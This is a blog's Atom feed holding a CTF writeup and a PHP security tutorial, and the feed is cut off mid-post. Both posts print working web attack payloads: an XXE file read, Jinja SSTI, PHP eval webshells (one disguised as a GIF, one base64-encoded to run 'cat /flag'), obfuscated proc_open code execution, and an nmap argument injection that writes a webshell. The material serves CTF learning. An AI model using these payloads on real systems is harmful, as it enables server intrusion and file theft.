<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sketch_pl4ne</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.sketchplane.top/"/>
  <updated>2019-11-25T16:04:32.786Z</updated>
  <id>https://www.sketchplane.top/</id>
  
  <author>
    <name>sketch_pl4ne</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>NJUPT CTF writeup</title>
    <link href="https://www.sketchplane.top/2019/11/22/NJCTF_WP/"/>
    <id>https://www.sketchplane.top/2019/11/22/NJCTF_WP/</id>
    <published>2019-11-22T13:25:11.000Z</published>
    <updated>2019-11-25T16:04:32.786Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打打小比赛练练手~</p><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">GVI</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">flag</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;W3lc0m3_T0_NCTF_9102&#125;</span><br></pre></td></tr></table></figure><h4 id="True-XML-cookbook（未解出）"><a href="#True-XML-cookbook（未解出）" class="headerlink" title="True XML cookbook（未解出）"></a>True XML cookbook（未解出）</h4><h4 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/f'</span>+<span class="string">'lag'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>额，算是非常简单的SSTI了，可以看我博客：sketchplane.top</p><h4 id="upload-your-shell"><a href="#upload-your-shell" class="headerlink" title="upload your shell"></a>upload your shell</h4><p>1， 直接上传一个v01cano.jpg文件，文件内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[1]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>2， 得到返回文件地址：</p><p>filepath:/var/www/html/upload-imgs/11d27c0cfce57aa050a1815412e1bb81/Th1s_is_a_fl4g.jpg</p><p><img src="https://t1.picb.cc/uploads/2019/11/25/k6VzCG.png" alt="img"></p><p>3， 直接利用文件读取漏洞，读取Th1s_is_a_fl4g.jpg文件的内容：</p><p><a href="http://nctf2019.x1ct34m.com:60002/index.php?action=upload-imgs/11d27c0cfce57aa050a1815412e1bb81/Th1s_is_a_fl4g.jpg" target="_blank" rel="noopener">http://nctf2019.x1ct34m.com:60002/index.php?action=upload-imgs/11d27c0cfce57aa050a1815412e1bb81/Th1s_is_a_fl4g.jpg</a></p><p>得到flag如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;upload_1s_s0_funn7&#125;</span><br></pre></td></tr></table></figure><h4 id="simple-xss"><a href="#simple-xss" class="headerlink" title="simple_xss"></a>simple_xss</h4><p>直接在内容框中插入一段打cookie的js代码，成功获取cookie:</p><p><img src="https://t1.picb.cc/uploads/2019/11/25/k6VEsj.png" alt=""></p><p>替换cookie获取flag：</p><p><img src="https://t1.picb.cc/uploads/2019/11/25/k6VYIc.png" alt=""></p><h4 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h4><p>“/robots.txt”-&gt;“/hint.txt”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$black_list &#x3D; &quot;&#x2F;limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|&#x3D;| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep&#x2F;i&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If $_POST[&#39;passwd&#39;] &#x3D;&#x3D;&#x3D; admin&#39;s password,</span><br><span class="line"></span><br><span class="line">Then you will get the flag;</span><br></pre></td></tr></table></figure><p>不多说废话直接上图</p><p><img src="https://t1.picb.cc/uploads/2019/11/24/k6ynjM.png" alt=""></p><p><img src="https://t1.picb.cc/uploads/2019/11/24/k6yeYt.png" alt=""></p><p>脚本会检测到%00，手工Fuzz，wsl</p><h4 id="phar-matches-everything-未解出"><a href="#phar-matches-everything-未解出" class="headerlink" title="phar matches everything (未解出)"></a>phar matches everything (未解出)</h4><p>Warning: getimagesize(<a href="http://nctf2019.x1ct34m.com:40004/upload.php%00.jpg" target="_blank" rel="noopener">http://nctf2019.x1ct34m.com:40004/upload.php%00.jpg</a>): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found in /var/www/html/catchmime.php on line 28<br>File is not an image.</p><p>参考链接：<br><a href="https://www.secpulse.com/archives/94680.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/94680.html</a><br><a href="https://www.cnblogs.com/BOHB-yunying/p/11504051.html" target="_blank" rel="noopener">https://www.cnblogs.com/BOHB-yunying/p/11504051.html</a><br><a href="https://blog.csdn.net/xiaorouji/article/details/83118619" target="_blank" rel="noopener">https://blog.csdn.net/xiaorouji/article/details/83118619</a></p><h4 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">23333</span>%<span class="number">0</span>a</span><br><span class="line">&amp;str1=<span class="number">240610708</span></span><br><span class="line">&amp;str2=QPPQKSY</span><br><span class="line">&amp;q.w.q=ca\t *</span><br></pre></td></tr></table></figure><p>这道题学到不少2333</p><h5 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h5><p>利用preg_match()不匹配换行符 (应该是，有时候感觉这种东西不好说= =</p><h5 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h5><p>strtr()是按单个字符匹配替换的。。。</p><h5 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h5><p>$_GET[‘c_m_d’] ，传参时 c_m_d 等价于 c.m.d</p><p>cat * 直接getflag</p><h4 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h4><p>pat=xxx&amp;sub=xxx&amp;rep=%40eval(%40base64_decode(%24_POST%5Bn0ee1cca39220e%5D))%3B&amp;n0ee1cca39220e=c3lzdGVtKCJjYXQgL2ZsYWciKTs=</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;getshe11_has_different_methods&#125;</span><br></pre></td></tr></table></figure><h4 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h4><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">code=$p = proc_.open;</span><br><span class="line">$p1 = p.i.pe;</span><br><span class="line">$s = stre.am_.ge.t_con.te.nts;</span><br><span class="line">$arr =   <span class="keyword">array</span>(  </span><br><span class="line"> <span class="number">0</span> = <span class="keyword">array</span>($p1,r),</span><br><span class="line"> <span class="number">1</span> = <span class="keyword">array</span>($p1,w),</span><br><span class="line"> <span class="number">2</span> = <span class="keyword">array</span>(fi.le,tmperror.l.og, a)</span><br><span class="line"> );    </span><br><span class="line">$cwd = ;</span><br><span class="line">$env = <span class="keyword">array</span>();</span><br><span class="line">$process = $p(readflag, $arr, $p1, $cwd,$env);<span class="keyword">echo</span> $s($p1[<span class="number">1</span>]);</span><br><span class="line">&amp;useful=etcpasswd</span><br></pre></td></tr></table></figure><p>search directory:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=$a=$p=<span class="string">"/readflag"</span>;$d=<span class="string">"d"</span>.<span class="string">"i"</span>.<span class="string">"r"</span>;$o=$d($p);$r=<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"a"</span>.<span class="string">"d"</span>;<span class="keyword">while</span> (<span class="keyword">false</span> !== ($entry = $o-&gt;$r())) &#123;</span><br><span class="line">   <span class="keyword">echo</span> $entry.<span class="string">"\n"</span>;</span><br><span class="line">&#125;&amp;useful=/etc/passwd</span><br></pre></td></tr></table></figure><p>readfile:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=$v=<span class="string">"var_"</span>.<span class="string">"dump"</span>;$f=<span class="string">"fil"</span>.<span class="string">"e"</span>;$v($f(<span class="string">"/readflag"</span>));</span><br><span class="line">&amp;useful=/etc/passwd</span><br></pre></td></tr></table></figure><p>RCE:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?code=$p = <span class="string">"proc_"</span>.<span class="string">"open"</span>;</span><br><span class="line">$p1 = <span class="string">"p"</span>.<span class="string">"i"</span>.<span class="string">"pe"</span>;</span><br><span class="line">$s = <span class="string">"stre"</span>.<span class="string">"am_"</span>.<span class="string">"ge"</span>.<span class="string">"t_con"</span>.<span class="string">"te"</span>.<span class="string">"nts"</span>;</span><br><span class="line">$arr =   <span class="keyword">array</span>(  </span><br><span class="line"> <span class="number">0</span> =&gt; <span class="keyword">array</span>($p1,<span class="string">"r"</span>),</span><br><span class="line"> <span class="number">1</span> =&gt; <span class="keyword">array</span>($p1,<span class="string">"w"</span>),</span><br><span class="line"> <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">"fi"</span>.<span class="string">"le"</span>,<span class="string">"/tmp/error.l"</span>.<span class="string">"og"</span>, <span class="string">"a"</span>)</span><br><span class="line"> );    </span><br><span class="line">$cwd = <span class="string">"/"</span>;</span><br><span class="line">$env = <span class="keyword">array</span>();</span><br><span class="line">$process = $p(<span class="string">"/readflag"</span>, $arr, $p1, $cwd,$env);<span class="keyword">echo</span> $s($p1[<span class="number">1</span>]);</span><br><span class="line">&amp;useful=/etc/passwd</span><br></pre></td></tr></table></figure><p>我的心路历程都在这了。。。</p><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="DEBUG"><a href="#DEBUG" class="headerlink" title="DEBUG"></a>DEBUG</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;just_debug_it_2333&#125;</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://blog.csdn.net/weixin_42621117/article/details/99768988" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42621117/article/details/99768988</a></p><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'139.129.76.65'</span>, <span class="number">50003</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;hell0__play&#125;</span><br></pre></td></tr></table></figure><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="a-good-idea"><a href="#a-good-idea" class="headerlink" title="a_good_idea"></a>a_good_idea</h4><p>图片尾部附加了压缩包，解压得到提示和两个图片，提示比较两图片像素，使用Stegsolve “to_do.png”-“to.png”=flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;m1sc_1s_very_funny!!!&#125;</span><br></pre></td></tr></table></figure><h4 id="Become-a-Rockstar"><a href="#Become-a-Rockstar" class="headerlink" title="Become a Rockstar"></a>Become a Rockstar</h4><p>所有“says”后面的东西拼一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;youarnicerockstar&#125;</span><br></pre></td></tr></table></figure><h4 id="Bright-Body-I"><a href="#Bright-Body-I" class="headerlink" title="Bright Body I"></a>Bright Body I</h4><p>\Bright Body I\Magic\Content\Paks\Magic-WindowsNoEditor.pak文件中直接搜“NCTF”得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;R_U_4_D4rk5Ou1s_III_P14y3r&#125;</span><br></pre></td></tr></table></figure><h4 id="有内鬼-终止交易"><a href="#有内鬼-终止交易" class="headerlink" title="有内鬼,终止交易"></a>有内鬼,终止交易</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// config.json</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"server"</span>:<span class="string">"123.207.121.32"</span>,</span><br><span class="line">    <span class="attr">"server_port"</span>:<span class="number">25565</span>,</span><br><span class="line">    <span class="attr">"local_port"</span>:<span class="number">1080</span>,</span><br><span class="line">    <span class="attr">"password"</span>:<span class="string">"5e77b05530b30283e24c120d8cc13fb5"</span>,</span><br><span class="line">    <span class="attr">"timeout"</span>:<span class="number">600</span>,</span><br><span class="line">    <span class="attr">"method"</span>:<span class="string">"aes-256-cfb"</span>,</span><br><span class="line">    <span class="attr">"local_address"</span>:<span class="string">"127.0.0.1"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shadowsocks流量包解密</p><h4 id="键盘侠"><a href="#键盘侠" class="headerlink" title="键盘侠"></a>键盘侠</h4><p>伪加密解压得到图片，尾部附加doc文档，文件-选项-显示隐藏文字，选中文字-字体-取消隐藏-复制-base85解密得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原文</span></span><br><span class="line">PD4~idqQC|WjHloX&gt;)UPb8~ZFb8laGczAeteE</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">NCTF&#123;Ba3e85_issssss_so_xxxxx&#125;</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://www.cnblogs.com/Yuuki-/p/7897069.html" target="_blank" rel="noopener">https://www.cnblogs.com/Yuuki-/p/7897069.html</a></p><h4 id="What’s-this"><a href="#What’s-this" class="headerlink" title="What’s this"></a>What’s this</h4><p>导出压缩包，伪加密解密得到文本文件，base64隐写解密，二进制转字符串得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;dbb2ef54afc2877ed9973780606a3c8b&#125;</span><br></pre></td></tr></table></figure><h4 id="2077"><a href="#2077" class="headerlink" title="2077"></a>2077</h4><p>i:0-2986<br><a href="https://vod-secure.twitch.tv/0b27f6f98c0cbb6c6c1e_cdprojektred_30100213392_949888768/360p30/i.ts" target="_blank" rel="noopener">https://vod-secure.twitch.tv/0b27f6f98c0cbb6c6c1e_cdprojektred_30100213392_949888768/360p30/i.ts</a><br><a href="https://vod-secure.twitch.tv/0b27f6f98c0cbb6c6c1e_cdprojektred_30100213392_949888768/chunked/i.ts" target="_blank" rel="noopener">https://vod-secure.twitch.tv/0b27f6f98c0cbb6c6c1e_cdprojektred_30100213392_949888768/chunked/i.ts</a></p><p>wget -i dl.csv</p><p>ffmpeg -f concat -i filelist.txt -c copy output.mp4</p><p>ffmpeg -i output.mp4 -r 0.018 image-%05d.jpg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PSC:\&gt;.&#x2F;drop_package</span><br><span class="line">iVBORw0KGgoAAAANSUhEUgAAB4AAAAQ4CAIAAABnSVYUAAjxYk1EQVR4AYzYBXPbyrcA8JQS</span><br><span class="line">s0VmjplR5khmhpgxdhx0kzTc9DK0vfjud35HVv6+KTyY+c3O0eosaAUzq+ce&#x2F;xrD95zhEQCX</span><br><span class="line"></span><br><span class="line">BwMOtwDYXUKHW+RyIsDjxoDXiy6Jgc+HsJaHQuD2CV1eaMgDy+28m5th9wiWeOAxdiM21&#x2F;hL</span><br><span class="line">bD6wunhPWZzcL0E9m&#x2F;zFKFAv&#x2F;JLdI3J6sc&#x2F;Axbq9OHtdfi8W8OEBHxoK4I9C&#x2F;EhE9CgmZsUS</span><br><span class="line">aCwm+1xcAqIxYgn7f4pE8f8F2xt0uxKP4SAWxUAkjIRJcZhEQ0GmjISxaFQciyHxuDiRQLa2</span><br><span class="line"></span><br><span class="line">SCWEQYlWEglGPC4EsZjocwkhiCdFgG1LUThNE0+1UhJA0xgjhVC0GEBAp0QglRYDOi2jUtKn</span><br><span class="line">tmjJEp6ksE8hYItG13AqRUAyNAepjDyVkaazMrYE2bwCQPAUpIHHnLQUZGh8JUujuRQGJStD</span><br><span class="line"></span><br><span class="line">&#x2F;TEA9yKRYB6ARAIeIYKiJRBudyqFA2YFcsI1&#x2F;pIYUHnZVk4aLUhDGcyxJTNFUJ2HkFkEMhVP</span><br><span class="line">ouAoZQy1cl2r5mj160CtfQkUKgFQaUQaHQK0ehRiqJEpeECu5LPBV0nlXIaMvyKTC8DTHKVq</span><br></pre></td></tr></table></figure><h4 id="pip-install"><a href="#pip-install" class="headerlink" title="pip install"></a>pip install</h4><p>运行命令pip install –user nctf-2019-installme，在控制台输出包含压缩包下载链接，下载解压得到源码，在“setup.py”找到base64加密的flag，解码得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;c4reful_ab0u7_ev1l_pip_p4ckage&#125;</span><br></pre></td></tr></table></figure><p>卸载库pip uninstall nctf-2019-installme，真实flag文件位置在//TODO</p><h4 id="NCTF2019问卷调查"><a href="#NCTF2019问卷调查" class="headerlink" title="NCTF2019问卷调查"></a>NCTF2019问卷调查</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;Thank_you_for_participating_NCTF2019!&#125;</span><br></pre></td></tr></table></figure><h4 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h4><p>wertyuio分别对应2-9，对应手机九键…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;youaresosmartthatthisisjustapieceofcake&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>真就差1名呗= =</p><p>已经是第三次差一点了，主要还是wtcl，有一个flask debug 还差一点。</p><p>另外感谢<strong>T1M</strong>师傅和<strong>火山</strong>师傅带飞~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;打打小比赛练练手~&lt;/p&gt;
&lt;h3 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WE
      
    
    </summary>
    
    
    
      <category term="Write up" scheme="https://www.sketchplane.top/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>数组键截断与参数注入</title>
    <link href="https://www.sketchplane.top/2019/10/25/%E6%95%B0%E7%BB%84%E9%94%AE%E6%88%AA%E6%96%AD%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/"/>
    <id>https://www.sketchplane.top/2019/10/25/%E6%95%B0%E7%BB%84%E9%94%AE%E6%88%AA%E6%96%AD%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/</id>
    <published>2019-10-25T04:34:15.000Z</published>
    <updated>2019-10-25T05:28:19.850Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>划水划累了，学习一哈。</p><h2 id="escapeshellarg-escapeshellcmd"><a href="#escapeshellarg-escapeshellcmd" class="headerlink" title="escapeshellarg + escapeshellcmd"></a>escapeshellarg + escapeshellcmd</h2><p><code>escapeshellarg</code>与<code>escapeshellcmd</code>两个函数都是php设置来转义非法字符的，不过由于它们俩的转义规则有所不同，<strong>当先使用<code>escapeshellarg</code>再使用<code>escapeshellcmd</code>时可能导致命令参数注入</strong>。</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><code>escapeshellarg</code>：对单引号转义，并在两边再加上单引号</p><p><code>escapeshellcmd</code>：对单引号转义，且不转义成对引号</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><img src="https://mochazz.github.io/img/PHP-Audit-Labs/Day5/5.png" alt=""></p><p>最后执行的语句变成</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl '127.0.0.1'\\'' -v -d a=1\'</span><br></pre></td></tr></table></figure><p>简化一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 127.0.0.1\ -v -d a&#x3D;1&#39;</span><br></pre></td></tr></table></figure><p><em>成功实现参数注入</em>~</p><h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><p>考察点：nmap -oG 参数写<code>webshell</code>，参数注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=' &lt;?php @eval($_POST["sketch_pl4ne"])?&gt;  -oG shell.php '</span><br></pre></td></tr></table></figure><p><strong>PS：参数记得用双引号</strong></p><h2 id="0-gt-0-0x100000000-gt-0"><a href="#0-gt-0-0x100000000-gt-0" class="headerlink" title="[0 =&gt; 0] === [0x100000000 =&gt; 0]"></a>[0 =&gt; 0] === [0x100000000 =&gt; 0]</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>偶然在群里看到的一道题，刚开始以为没什么难度，实际上还是有点东西的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$user = [<span class="string">'admin'</span>, <span class="string">'xxoo'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'user'</span>]))  <span class="keyword">die</span>(show_souce(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'user'</span>] === $user &amp;&amp; $_GET[<span class="string">'user'</span>][<span class="number">0</span>] != <span class="string">'admin'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'sketch_pl4ne_wants_a_girlfriend.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>这个实际上考的是<strong>索引数组的整数键截断</strong>：<a href="https://bugs.php.net/bug.php?id=69892" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=69892</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump([<span class="number">0</span> =&gt; <span class="number">0</span>] === [<span class="number">0x100000000</span> =&gt; <span class="number">0</span>]); <span class="comment">// bool(true)</span></span><br></pre></td></tr></table></figure><p>于是构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?user[<span class="number">4294967296</span>]=admin&amp;user[<span class="number">1</span>]=xxoo</span><br><span class="line"><span class="comment">//0x100000000 == 4294967296</span></span><br></pre></td></tr></table></figure><p><strong>PS：这个漏洞仅在64位php中有效</strong></p><h3 id="拓展知识"><a href="#拓展知识" class="headerlink" title="拓展知识"></a>拓展知识</h3><p>如何判断自己的php是32位还是64位</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (PHP_INT_SIZE == <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'if 64-bit version of PHP'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> 